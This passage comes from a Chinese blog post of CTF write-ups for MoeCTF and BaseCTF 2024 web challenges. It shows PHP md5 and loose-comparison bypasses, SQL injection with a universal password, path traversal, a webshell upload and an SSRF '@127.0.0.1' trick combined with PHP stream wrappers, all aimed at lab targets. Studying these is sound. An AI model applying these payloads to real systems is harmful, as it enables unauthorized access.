       <span class="hljs-keyword">return</span> filename.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>(); <span class="hljs-comment">// 转换为小写以统一比较</span>
   }</code></pre>
<p>文件上传都由前端js进行校验，分析上述代码可以知道：</p>
<p><code>const input = $("#imageInput")[0];</code>在提醒我们，可以进行多文件上传，而js只检测了上传的第一个文件，只要我们第一个文件符合上述条件即可。第二个文件随意上传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023964.png" alt="image-20240819104128774"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023965.png" alt="image-20240819103930407"></p>
<h2 id="静态网页">静态网页</h2>
<p>这道题首先是个静态网页，那只能扫目录，然后测试网站的所有功能，以便发现可疑之处。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023966.png" alt="image-20240819111217161"></p>
<p>不幸的是扫目录并没有什么发现。接着就是测试功能了，如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023967.png" alt="image-20240819111309919"></p>
<p>这里知道点击换衣服的时候，会像后端请求，那我们肯定是从这里入手，可能就会请求到一些hint</p>
<p>这里我点击换衣服然后bp抓包，也是放包了半天，发现两个接口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023969.png" alt="image-20240819111435245"></p>
<p>上面这个接口，没有测试出来是干嘛的。感觉就是请求图片的意思（换衣服），并且也提示我们请求的地方不正确。接着放包发现下面的接口，直接尝试发包，发现flag hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023970.png" alt="image-20240819111412720"></p>
<p>访问即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">'final1l1l_challenge.php'</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;

<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) {
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'noooooooooooo'</span>);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">die</span>( <span class="hljs-string">'Notice the param type!'</span>);
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'Where is your param?'</span>);
}</code></pre>
<p>意思是，a和b不能为数字，且a弱等于0，b[a]弱等于md5(a)，本地测试即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;

<span class="hljs-variable">$b</span> = <span class="hljs-string">'0ybcx'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>];
<span class="hljs-comment">//cfcd208495d565ef66e7dff9f98764da&lt;/br&gt;0</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>不难发现，可以构造</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">a</span>=QNKCDZO
<span class="hljs-selector-tag">b</span>=<span class="hljs-number">0</span>hybcx</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023971.png" alt="image-20240819111834681"></p>
<h2 id="电院_backend">电院_Backend</h2>
<p>源码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>){
    <span class="hljs-variable">$verify_code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'verify_code'</span>];

    <span class="hljs-comment">// 验证验证码</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$verify_code</span>) || <span class="hljs-variable">$verify_code</span> !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'captcha_code'</span>]) {
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">0</span>,<span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'验证码错误啦，再输入吧'</span>));
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'captcha_code'</span>]);
        <span class="hljs-keyword">exit</span>;
    }

    <span class="hljs-variable">$email</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'email'</span>];
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/"</span>, <span class="hljs-variable">$email</span>)||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/or/i"</span>, <span class="hljs-variable">$email</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">0</span>,<span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'不存在邮箱为： '</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">' 的管理员账号！'</span>));
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'captcha_code'</span>]);
        <span class="hljs-keyword">exit</span>;
    }

    <span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pwd'</span>];
    <span class="hljs-variable">$pwd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pwd</span>);
    <span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>,<span class="hljs-string">"xdsec"</span>,<span class="hljs-number">3306</span>);


    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"SELECT * FROM admin WHERE email='<span class="hljs-subst">$email</span>' AND pwd='<span class="hljs-subst">$pwd</span>'"</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);
    <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>);

    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>){
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'admin_id'</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">'id'</span>];
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'admin_email'</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">'email'</span>];
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">1</span>,<span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'登陆成功，moectf{testflag}'</span>));
    } <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">0</span>,<span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'管理员邮箱或密码错误'</span>));
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'captcha_code'</span>]);
    }
}


<span class="hljs-meta">?&gt;</span></code></pre>
<p>很明显是sql注入，这里pwd肯定无从下手，只能对email参数进行注入，直接闭合，然后万能密码即可</p>
<p>至于注入点，扫目录就能发现admin</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023972.png" alt="image-20240819123234364"></p>
<h2 id="勇闯铜人阵">勇闯铜人阵</h2>
<p>明显是让锻炼写脚本，根据题目要求，会出现一个数字或者是两个数字的情况，对应的答案也需要稍微变化。</p>
<p>先构造好答案，之后就是F12查看元素位置，分别需要查看“开始按钮”、“选手名字”、“回答问题”，“回答按钮”元素位置，接着只需要注意第一次回答需要输入“弟子明白”，然后3s内回答完即可，脚本如下：</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver
<span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 方位映射字典</span>
directions = {
    <span class="hljs-number">1</span>: <span class="hljs-string">"北方"</span>,
    <span class="hljs-number">2</span>: <span class="hljs-string">"东北方"</span>,
    <span class="hljs-number">3</span>: <span class="hljs-string">"东方"</span>,
    <span class="hljs-number">4</span>: <span class="hljs-string">"东南方"</span>,
    <span class="hljs-number">5</span>: <span class="hljs-string">"南方"</span>,
    <span class="hljs-number">6</span>: <span class="hljs-string">"西南方"</span>,
    <span class="hljs-number">7</span>: <span class="hljs-string">"西方"</span>,
    <span class="hljs-number">8</span>: <span class="hljs-string">"西北方"</span>,
    <span class="hljs-number">9</span>: <span class="hljs-string">"中央"</span>
}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">format_directions</span>(<span class="hljs-params">numbers</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(numbers) == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> directions[numbers[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">else</span>:
        result = [<span class="hljs-string">f"<span class="hljs-subst">{directions[num]}</span>一个"</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers]
        <span class="hljs-keyword">return</span> <span class="hljs-string">"，"</span>.join(result)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># 初始化webdriver</span>
    driver = webdriver.Chrome()

    <span class="hljs-comment"># 打开游戏网页</span>
    driver.get(<span class="hljs-string">"http://127.0.0.1:27094/"</span>)

    <span class="hljs-comment"># 输入选手名字并开始游戏</span>
    name_input = driver.find_element(By.ID, <span class="hljs-string">"player"</span>)
    start_button = driver.find_element(By.ID, <span class="hljs-string">"restart"</span>)

    name_input.send_keys(<span class="hljs-string">"hybcx"</span>)  <span class="hljs-comment"># 替换为选手的名字</span>
    start_button.click()

    <span class="hljs-comment"># 输入"弟子明白"并提交</span>
    answer_input = driver.find_element(By.ID, <span class="hljs-string">"direct"</span>)
    answer_input.send_keys(<span class="hljs-string">"弟子明白"</span>)

    say_button = driver.find_element(By.ID, <span class="hljs-string">"say"</span>)
    say_button.click()

    <span class="hljs-comment"># 等待游戏开始</span>
    time.sleep(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-comment"># 获取状态信息</span>
        status_element = driver.find_element(By.ID, <span class="hljs-string">"status"</span>)
        status_text = status_element.text

        <span class="hljs-keyword">if</span> <span class="hljs-string">"你是上来捣乱的吗"</span> <span class="hljs-keyword">in</span> status_text:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"回答错误，游戏结束。"</span>)
            <span class="hljs-keyword">break</span>

        <span class="hljs-comment"># 提取数字并转换为方向</span>
        <span class="hljs-keyword">try</span>:
            numbers = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, status_text.split(<span class="hljs-string">","</span>)))
            answer_text = format_directions(numbers)
        <span class="hljs-keyword">except</span> ValueError:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"未检测到有效的数字，继续等待..."</span>)
            <span class="hljs-keyword">continue</span>

        <span class="hljs-comment"># 提交答案</span>
        answer_input = driver.find_element(By.ID, <span class="hljs-string">"direct"</span>)
        say_button = driver.find_element(By.ID, <span class="hljs-string">"say"</span>)

        answer_input.send_keys(answer_text)
        say_button.click()

        <span class="hljs-comment"># 等待一下再进行下一轮检测</span>
        time.sleep(<span class="hljs-number">2</span>)

    driver.quit()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023973.png" alt="image-20240819155541459"></p>
<h2 id="垫刀之路04-一个文件浏览器">垫刀之路04: 一个文件浏览器</h2>
<p>目录穿越，列出根目录，找flag就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240821092855045.png" alt="image-20240821092855045"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240821092832578.png" alt="image-20240821092832578"></p>
<h2 id="垫刀之路05-登陆网站">垫刀之路05: 登陆网站</h2>
<p>比“电院_Backend”更简单的万能密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240821093447955.png" alt="image-20240821093447955"></p>
<h2 id="垫刀之路06-pop-base-mini-moe">垫刀之路06: pop base mini moe</h2>
<h1 id="basectf-2024">BaseCTF 2024</h1>
<h2 id="week1-http">[Week1] HTTP</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023974.png" alt="image-20240819180520937"></p>
<p>简单的http请求，不过flag在302跳转的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023975.png" alt="image-20240819180504299"></p>
<h2 id="week1-喵喵喵-́ع">[Week1] 喵喵喵´•ﻌ•`</h2>
<p>简单RCE</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023976.png" alt="image-20240819180703604"></p>
<h2 id="week1-md5绕过欸">[Week1] md5绕过欸</h2>
<p>md5绕过</p>
<pre><code class="hljs scss"><span class="hljs-built_in">md5</span>('QNKCDZO') == <span class="hljs-built_in">md5</span>(<span class="hljs-number">240610708</span>)<span class="hljs-comment">//true</span>
<span class="hljs-comment">//MD5加密后会变成这个样子</span>
<span class="hljs-number">0</span>e830400451993494058024219903391 == <span class="hljs-number">0</span>e462097431906509019562988736854</code></pre>
<p>第二个数组绕过即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023977.png" alt="image-20240819180921655"></p>
<h2 id="week1-a-dark-room">[Week1] A Dark Room</h2>
<p>在源码里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023978.png" alt="image-20240819181039865"></p>
<h2 id="week1-upload">[Week1] upload</h2>
<p>直接上传木马即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023979.png" alt="image-20240819181329814"></p>
<h2 id="week1-aura-酱的礼物">[Week1] Aura 酱的礼物</h2>
<p>也是想了半天hint才反应过来</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">// Aura 酱，欢迎回家~</span>
<span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span>
<span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pen'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">'Aura'</span>)
{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'这是 Aura 的礼物，你不是 Aura！'</span>);
}

<span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span>
<span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'challenge'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">'http://jasmineaura.github.io'</span>) !== <span class="hljs-number">0</span>)
{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'这不是 Aura 的博客！'</span>);
}

<span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">'已经收到Kengwang的礼物啦'</span>) === <span class="hljs-literal">false</span>)
{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'请去博客里面写下感想哦~'</span>);
}

<span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span>
<span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'gift'</span>];
<span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);</code></pre>
<p>首先第一个，因为是POST，所以要用data伪协议绕过；第二个没啥好说的，博客地址肯定需要在开头。</p>
<p>第三个，hint说是ssrf，一直没反应过来ssrf咋利用，看了别的师傅的提示，发现利用的是url解析的漏洞：<br>
一个url的访问实际上是以@后为准，<a target="_blank" rel="noopener" href="http://xn--xxx-eo8er22f.com">比如xxx.com</a>@127.0.0.1实际上访问的是127.0.0.1。</p>
<p>那这好办了，因为当前页面就存在<code>已经收到Kengwang的礼物啦</code>，直接@后面写127.0.0.1即可绕过，最后就是伪协议包含flag.php即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240820094804369.png" alt="image-20240820094804369"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/14/ctf-shua-ti/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/14/ctf-shua-ti/')">CTF刷题</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/14/ctf-shua-ti/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=CTF刷题&amp;url=http://hybcx.xyz/2024/07/14/ctf-shua-ti/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF赛事<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/12/thm-weaponization/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Weaponization</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/14/thm-password-gong-ji/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-password攻击</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/10/22/0xgame-2023/" title="0xGame 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-22</div><div class="title">0xGame 2023</div></div></a></div><div><a href="/2023/10/02/2023shctf/" title="SHCTF 2023-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-02</div><div class="title">SHCTF 2023-wp</div></div></a></div><div><a href="/2024/05/21/ciscn-2024wp/" title="CISCN-2024Wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-21</div><div class="title">CISCN-2024Wp</div></div></a></div><div><a href="/2023/12/12/ctfhub-xi-lie/" title="CTFHub系列"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-12</div><div class="title">CTFHub系列</div></div></a></div><div><a href="/2024/01/24/ctf-shua-ti-zhi-lu/" title="CISCN国赛"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-01-24</div><div class="title">CISCN国赛</div></div></a></div><div><a href="/2024/03/17/fsctf-2023/" title="FSCTF 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div 